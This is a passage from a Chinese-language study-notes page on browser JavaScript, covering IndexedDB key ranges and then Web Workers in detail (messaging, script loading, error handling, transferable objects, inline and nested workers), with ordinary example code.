<span class="kd">var</span> <span class="nx">r6</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">bound</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="c1">// All keys &gt; x &amp;&amp; ≤ y</span>
<span class="kd">var</span> <span class="nx">r7</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">bound</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>

<span class="c1">// All keys ≥ x &amp;&amp;&lt; y</span>
<span class="kd">var</span> <span class="nx">r8</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">bound</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="c1">// The key = z</span>
<span class="kd">var</span> <span class="nx">r9</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">only</span><span class="p">(</span><span class="nx">z</span><span class="p">);</span>
</code></pre></div>

<p><code>IDBKeyRange.lowerBound()</code>、<code>IDBKeyRange.upperBound()</code>、<code>IDBKeyRange.bound()</code>这三个方法默认包括端点值，可以传入一个布尔值，修改这个属性。</p>
<p>与之对应，IDBKeyRange 对象有四个只读属性。</p>
<ul>
<li><code>IDBKeyRange.lower</code>：返回下限</li>
<li><code>IDBKeyRange.lowerOpen</code>：布尔值，表示下限是否为开区间（即下限是否排除在范围之外）</li>
<li><code>IDBKeyRange.upper</code>：返回上限</li>
<li><code>IDBKeyRange.upperOpen</code>：布尔值，表示上限是否为开区间（即上限是否排除在范围之外）</li>
</ul>
<p>IDBKeyRange 实例对象生成以后，将它作为参数输入 IDBObjectStore 或 IDBIndex 对象的<code>openCursor()</code>方法，就可以在所设定的范围内读取数据。</p>
<div class="codehilite"><pre><span></span><code>var t = db.transaction([&#39;people&#39;], &#39;readonly&#39;);
var store = t.objectStore(&#39;people&#39;);
var index = store.index(&#39;name&#39;);

var range = IDBKeyRange.bound(&#39;B&#39;, &#39;D&#39;);

index.openCursor(range).onsuccess = function (e) {
  var cursor = e.target.result;
  if (cursor) {
    console.log(cursor.key + &#39;:&#39;);

    for (var field in cursor.value) {
      console.log(cursor.value[field]);
    }
    cursor.continue();
  }
}
</code></pre></div>

<p>IDBKeyRange 有一个实例方法<code>includes(key)</code>，返回一个布尔值，表示某个主键是否包含在当前这个主键组之内。</p>
<div class="codehilite"><pre><span></span><code>var keyRangeValue = IDBKeyRange.bound(&#39;A&#39;, &#39;K&#39;, false, false);

keyRangeValue.includes(&#39;F&#39;) // true
keyRangeValue.includes(&#39;W&#39;) // false
</code></pre></div>

<h3 id="1015-web-worker">10.15 Web worker<a class="headerlink" href="#1015-web-worker" title="Permanent link">&para;</a></h3>
<p>注意：这部分实际工作没用过，简单了解。</p>
<h4 id="_27">概述<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h4>
<p>JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。</p>
<p>Web Worker 的作用，==就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行==。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务可以交由 Worker 线程执行，主线程（通常负责 UI 交互）能够保持流畅，不会被阻塞或拖慢。</p>
<p>Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。</p>
<p>Web Worker 有以下几个使用注意点。</p>
<p>（1）<strong>同源限制</strong></p>
<p>分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。</p>
<p>（2）<strong>DOM 限制</strong></p>
<p>==Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象==，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。但是，Worker 线程可以使用<code>navigator</code>对象和<code>location</code>对象。</p>
<p>（3）<strong>全局对象限制</strong></p>
<p>Worker 的全局对象<code>WorkerGlobalScope</code>，不同于网页的全局对象<code>Window</code>，很多接口拿不到。比如，理论上 Worker 线程不能使用<code>console.log</code>，因为标准里面没有提到 Worker 的全局对象存在<code>console</code>接口，只定义了<code>Navigator</code>接口和<code>Location</code>接口。不过，浏览器实际上支持 Worker 线程使用<code>console.log</code>，保险的做法还是不使用这个方法。</p>
<p>（4）<strong>通信联系</strong></p>
<p>Worker 线程和主线程不在同一个上下文环境，==它们不能直接通信，必须通过消息完成==。</p>
<p>（5）<strong>脚本限制</strong></p>
<p>Worker 线程不能执行<code>alert()</code>方法和<code>confirm()</code>方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。</p>
<p>（6）<strong>文件限制</strong></p>
<p>Worker 线程无法读取本地文件，即不能打开本机的文件系统（<code>file://</code>），它所加载的脚本，必须来自网络。</p>
<h4 id="_28">基本用法<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h4>
<h5 id="_29">主线程<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h5>
<p>主线程采用<code>new</code>命令，调用<code>Worker()</code>构造函数，新建一个 Worker 线程。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">worker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Worker</span><span class="p">(</span><span class="s1">&#39;work.js&#39;</span><span class="p">);</span>
<span class="c1">// 构造函数是一个脚本文件。因为workder 不能读取本地文件，所以这个文件必须来源于网络并下载好。如果没有下载，worker就会失败</span>
</code></pre></div>

<p>然后，主线程调用<code>worker.postMessage()</code>方法，向 Worker 发消息。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">worker</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Hello World&#39;</span><span class="p">);</span>
<span class="nx">worker</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span><span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;echo&#39;</span><span class="p">,</span> <span class="nx">args</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;Work&#39;</span><span class="p">]});</span>
</code></pre></div>

<p><code>worker.postMessage()</code>方法的参数，就是主线程传给 Worker 的数据。它可以是各种数据类型，包括二进制数据。接着，主线程通过<code>worker.onmessage</code>指定监听函数，接收子线程发回来的消息。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">worker</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">worker</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Work done!&#39;</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">// Worker 完成任务以后，主线程就可以把它关掉。</span>
<span class="nx">worker</span><span class="p">.</span><span class="nx">terminate</span><span class="p">();</span>
</code></pre></div>

<h5 id="worker">Worker 线程<a class="headerlink" href="#worker" title="Permanent link">&para;</a></h5>
<p>Worker 线程内部需要有一个监听函数，监听<code>message</code>事件。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">self</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;You said: &#39;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
</code></pre></div>

<p>上面代码中，<code>self</code>代表子线程自身，即子线程的全局对象。因此，等同于下面两种写法。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 写法一</span>
<span class="k">this</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;You said: &#39;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>

<span class="c1">// 写法二</span>
<span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;You said: &#39;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
</code></pre></div>

<p>除了使用<code>self.addEventListener()</code>指定监听函数，也可以使用<code>self.onmessage</code>指定。监听函数的参数是一个事件对象，它的<code>data</code>属性包含主线程发来的数据。<code>self.postMessage()</code>方法用来向主线程发送消息。</p>
<p>根据主线程发来的数据，Worker 线程可以调用不同的方法，下面是一个例子。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
  <span class="k">switch</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">cmd</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="s1">&#39;start&#39;</span><span class="o">:</span>
      <span class="nx">self</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;WORKER STARTED: &#39;</span> <span class="o">+</span> <span class="nx">data</span><span class="p">.</span><span class="nx">msg</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s1">&#39;stop&#39;</span><span class="o">:</span>
      <span class="nx">self</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;WORKER STOPPED: &#39;</span> <span class="o">+</span> <span class="nx">data</span><span class="p">.</span><span class="nx">msg</span><span class="p">);</span>
      <span class="nx">self</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span> <span class="c1">// Terminates the worker.</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">default</span><span class="o">:</span>
      <span class="nx">self</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Unknown command: &#39;</span> <span class="o">+</span> <span class="nx">data</span><span class="p">.</span><span class="nx">msg</span><span class="p">);</span>
  <span class="p">};</span>
<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
</code></pre></div>

<p>上面代码中，<code>self.close()</code>用于在 Worker 内部关闭自身。</p>
<h5 id="worker_1">Worker 加载脚本<a class="headerlink" href="#worker_1" title="Permanent link">&para;</a></h5>
<p>Worker 内部如果要加载其他脚本，有一个专门的方法<code>importScripts()</code>。</p>
<div class="codehilite"><pre><span></span><code>importScripts(&#39;script1.js&#39;);
</code></pre></div>

<p>该方法可以同时加载多个脚本。</p>
<div class="codehilite"><pre><span></span><code>importScripts(&#39;script1.js&#39;, &#39;script2.js&#39;);
</code></pre></div>

<h5 id="_30">错误处理<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h5>
<p>主线程可以监听 Worker 是否发生错误。如果发生错误，Worker 会触发主线程的<code>error</code>事件。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">worker</span><span class="p">.</span><span class="nx">onerror</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">([</span>
    <span class="s1">&#39;ERROR: Line &#39;</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">lineno</span><span class="p">,</span> <span class="s1">&#39; in &#39;</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">filename</span><span class="p">,</span> <span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">message</span>
  <span class="p">].</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">));</span>
<span class="p">});</span>

<span class="c1">// 或者</span>
<span class="nx">worker</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
<span class="p">});</span>
</code></pre></div>

<p>Worker 内部也可以监听<code>error</code>事件。</p>
<h5 id="worker_2">关闭 Worker<a class="headerlink" href="#worker_2" title="Permanent link">&para;</a></h5>
<p>使用完毕，为了节省系统资源，必须关闭 Worker。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 主线程</span>
<span class="nx">worker</span><span class="p">.</span><span class="nx">terminate</span><span class="p">();</span>

<span class="c1">// Worker 线程</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
</code></pre></div>

<h4 id="_31">数据通信<a class="headerlink" href="#_31" title="Permanent link">&para;</a></h4>
<p>前面说过，主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程。事实上，浏览器内部的运行机制是，先将通信内容串行化，然后把串行化后的字符串发给 Worker，后者再将它还原。</p>
<p>主线程与 Worker 之间也可以交换二进制数据，比如 File、Blob、ArrayBuffer 等类型，也可以在线程之间发送。下面是一个例子。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 主线程</span>
<span class="kd">var</span> <span class="nx">uInt8Array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mf">10</span><span class="p">));</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">uInt8Array</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">uInt8Array</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">*</span> <span class="mf">2</span><span class="p">;</span> <span class="c1">// [0, 2, 4, 6, 8,...]</span>
<span class="p">}</span>
<span class="nx">worker</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">uInt8Array</span><span class="p">);</span>

<span class="c1">// Worker 线程</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">uInt8Array</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
  <span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Inside worker.js: uInt8Array.toString() = &#39;</span> <span class="o">+</span> <span class="nx">uInt8Array</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
  <span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Inside worker.js: uInt8Array.byteLength = &#39;</span> <span class="o">+</span> <span class="nx">uInt8Array</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div>

<p>但是，拷贝方式发送二进制数据，会造成性能问题。比如，主线程向 Worker 发送一个 500MB 文件，默认情况下浏览器会生成一个原文件的拷贝。为了解决这个问题，JavaScript 允许主线程把二进制数据直接转移给子线程，但是一旦转移，主线程就无法再使用这些二进制数据了，这是为了防止出现多个线程同时修改数据的麻烦局面。这种转移数据的方法，叫做<a href="http://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects">Transferable Objects</a>。这使得主线程可以快速把数据交给 Worker，对于影像处理、声音处理、3D 运算等就非常方便了，不会产生性能负担。</p>
<p>如果要直接转移数据的控制权，就要使用下面的写法。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// Transferable Objects 格式</span>
<span class="nx">worker</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">arrayBuffer</span><span class="p">,</span> <span class="p">[</span><span class="nx">arrayBuffer</span><span class="p">]);</span>

<span class="c1">// 例子</span>
<span class="kd">var</span> <span class="nx">ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
<span class="nx">worker</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">ab</span><span class="p">,</span> <span class="p">[</span><span class="nx">ab</span><span class="p">]);</span>
</code></pre></div>

<h4 id="web-worker">同页面的 Web Worker<a class="headerlink" href="#web-worker" title="Permanent link">&para;</a></h4>
<p>通常情况下，Worker 载入的是一个单独的 JavaScript 脚本文件，但是也可以载入与主线程在同一个网页的代码。</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;worker&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;app/worker&quot;</span><span class="p">&gt;</span>
      <span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;some message&#39;</span><span class="p">);</span>
      <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>

<p>上面是一段嵌入网页的脚本，注意必须指定<code>&lt;script&gt;</code>标签的<code>type</code>属性是一个浏览器不认识的值，上例是<code>app/worker</code>。</p>
<p>然后，读取这一段嵌入页面的脚本，用 Worker 来处理。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#worker&#39;</span><span class="p">).</span><span class="nx">textContent</span><span class="p">]);</span>
<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">worker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Worker</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

<span class="nx">worker</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// e.data === &#39;some message&#39;</span>
<span class="p">};</span>
</code></pre></div>

<p>上面代码中，先将嵌入网页的脚本代码，转成一个二进制对象，然后为这个二进制对象生成 URL，再让 Worker 加载这个 URL。这样就做到了，主线程和 Worker 的代码都在同一个网页上面。</p>
<h4 id="worker_3">实例：Worker 线程完成轮询<a class="headerlink" href="#worker_3" title="Permanent link">&para;</a></h4>
<p>有时，浏览器需要轮询服务器状态，以便第一时间得知状态改变。这个工作可以放在 Worker 里面。</p>
<div class="codehilite"><pre><span></span><code>function createWorker(f) {
  var blob = new Blob([&#39;(&#39; + f.toString() + &#39;)()&#39;]);
  var url = window.URL.createObjectURL(blob);
  var worker = new Worker(url);
  return worker;
}

var pollingWorker = createWorker(function (e) {
  var cache;

  function compare(new, old) { ... };

  setInterval(function () {
    fetch(&#39;/my-api-endpoint&#39;).then(function (res) {
      var data = res.json();

      if (!compare(data, cache)) {
        cache = data;
        self.postMessage(data);
      }
    })
  }, 1000)
});

pollingWorker.onmessage = function () {
  // render data
}

pollingWorker.postMessage(&#39;init&#39;);
</code></pre></div>

<p>上面代码中，Worker 每秒钟轮询一次数据，然后跟缓存做比较。如果不一致，就说明服务端有了新的变化，因此就要通知主线程。</p>
<h4 id="worker-worker">实例： Worker 新建 Worker<a class="headerlink" href="#worker-worker" title="Permanent link">&para;</a></h4>
<p>Worker 线程内部还能再新建 Worker 线程（目前只有 Firefox 浏览器支持）。下面的例子是将一个计算密集的任务，分配到10个 Worker。</p>
<p>主线程代码如下。</p>
<div class="codehilite"><pre><span></span><code>var worker = new Worker(&#39;worker.js&#39;);
worker.onmessage = function (event) {
  document.getElementById(&#39;result&#39;).textContent = event.data;
};
</code></pre></div>

<p>Worker 线程代码如下。</p>
<div class="codehilite"><pre><span></span><code>// worker.js

// settings
var num_workers = 10;
var items_per_worker = 1000000;

// start the workers
var result = 0;
var pending_workers = num_workers;
for (var i = 0; i &lt; num_workers; i += 1) {
  var worker = new Worker(&#39;core.js&#39;);
  worker.postMessage(i * items_per_worker);
  worker.postMessage((i + 1) * items_per_worker);
  worker.onmessage = storeResult;
}

// handle the results
function storeResult(event) {
  result += event.data;
  pending_workers -= 1;
  if (pending_workers &lt;= 0)
    postMessage(result); // finished!
}
</code></pre></div>

<p>上面代码中，Worker 线程内部新建了10个 Worker 线程，并且依次向这10个 Worker 发送消息，告知了计算的起点和终点。计算任务脚本的代码如下。</p>
<div class="codehilite"><pre><span></span><code>// core.js
var start;
onmessage = getStart;
function getStart(event) {
  start = event.data;
  onmessage = getEnd;
}

var end;
function getEnd(event) {
  end = event.data;
  onmessage = null;
  work();
}

function work() {
  var result = 0;
  for (var i = start; i &lt; end; i += 1) {
    // perform some complex calculation here
    result += 1;
  }
  postMessage(result);
  close();
}
</code></pre></div>

<h4 id="api">API<a class="headerlink" href="#api" title="Permanent link">&para;</a></h4>
<h5 id="_32">主线程<a class="headerlink" href="#_32" title="Permanent link">&para;</a></h5>
<p>浏览器原生提供<code>Worker()</code>构造函数，用来供主线程生成 Worker 线程。</p>
<div class="codehilite"><pre><span></span><code>var myWorker = new Worker(jsUrl, options);
</code></pre></div>

<p><code>Worker()</code>构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。</p>
<div class="codehilite"><pre><span></span><code>// 主线程
var myWorker = new Worker(&#39;worker.js&#39;, { name : &#39;myWorker&#39; });

// Worker 线程
self.name // myWorker
</code></pre></div>

<p><code>Worker()</code>构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。</p>
<ul>
<li>Worker.onerror：指定 error 事件的监听函数。</li>
<li>Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在<code>Event.data</code>属性中。</li>
<li>Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>
<li>Worker.postMessage()：向 Worker 线程发送消息。</li>
<li>Worker.terminate()：立即终止 Worker 线程。</li>
</ul>
<h5 id="worker_4">Worker 线程<a class="headerlink" href="#worker_4" title="Permanent link">&para;</a></h5>
<p>Web Worker 有自己的全局对象，不是主线程的<code>window</code>，而是一个专门为 Worker 定制的全局对象。因此定义在<code>window</code>上面的对象和方法不是全部都可以使用。</p>
<p>Worker 线程有一些自己的全局属性和方法。</p>
<ul>
<li>self.name： Worker 的名字。该属性只读，由构造函数指定。</li>
<li>self.onmessage：指定<code>message</code>事件的监听函数。</li>
<li>self.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>
<li>self.close()：关闭 Worker 线程。</li>
<li>self.postMessage()：向产生这个 Worker 线程发送消息。</li>
<li>self.importScripts()：加载 JS 脚本。</li>
</ul>
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; Michael An
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/vendor.18f0862e.min.js"></script>
      <script src="../../assets/javascripts/bundle.994580cf.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../..",
          features: [],
          search: Object.assign({
            worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script src="../../js/baidu-statistics.js"></script>
      
    
  </body>
</html>